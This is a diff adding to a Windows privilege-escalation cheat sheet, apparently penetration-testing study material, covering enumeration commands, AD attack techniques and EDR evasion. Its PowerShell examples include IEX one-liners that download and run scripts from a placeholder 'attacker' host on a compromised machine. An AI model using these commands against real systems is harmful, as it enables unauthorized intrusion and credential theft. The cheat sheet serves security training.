@@ -1,3 +1,5 @@
+# Windows Privilege Escalation
+
 ## Initial Enumeration
 
 | **Command** | **Description** |
@@ -132,3 +134,33 @@
 | `guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1` |Mount VHD/VHDX on Linux|
 | `sudo python2.7 windows-exploit-suggester.py  --update` |Update Windows Exploit Suggester database|
 | `python2.7 windows-exploit-suggester.py  --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt` |Running Windows Exploit Suggester|
+
+## 2026 Notes
+
+- Prefer **WinPEAS** (https://github.com/carlospolop/PEASS-ng) over old suggesters.
+- BloodHound / SharpHound for AD attacks and priv esc paths.
+- Modern Windows: look for unquoted service paths, weak service perms, token impersonation (SeImpersonate), Print Spooler legacy, recent LPE via drivers or kernel.
+- Tools: PowerUp (legacy), PrivescCheck.ps1, Watson (for missing patches), SharpUp.
+- AD: Kerberoasting, ASREPRoasting, DCSync via secretsdump or mimikatz equivalents, ACL abuse (BloodHound shines here).
+- EDR evasion important; many classic techniques now heavily monitored.
+
+References: HackTricks Windows, PayloadsAllTheThings Windows, PEASS-ng.
+
+## Additional Practical Examples
+
+```powershell
+# WinPEAS
+IEX(New-Object Net.WebClient).DownloadString('http://attacker/winPEAS.ps1'); Invoke-WinPEAS
+
+# Check for unquoted service paths
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
+
+# Token impersonation (SeImpersonatePrivilege)
+# Use PrintSpoofer or RoguePotato / JuicyPotatoNG
+
+# SharpUp (audit)
+IEX (iwr http://attacker/SharpUp.ps1 -UseBasicParsing); Invoke-AllChecks
+
+# BloodHound collection from compromised host
+IEX (New-Object Net.Webclient).DownloadString('http://attacker/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All -Domain corp.local
+```
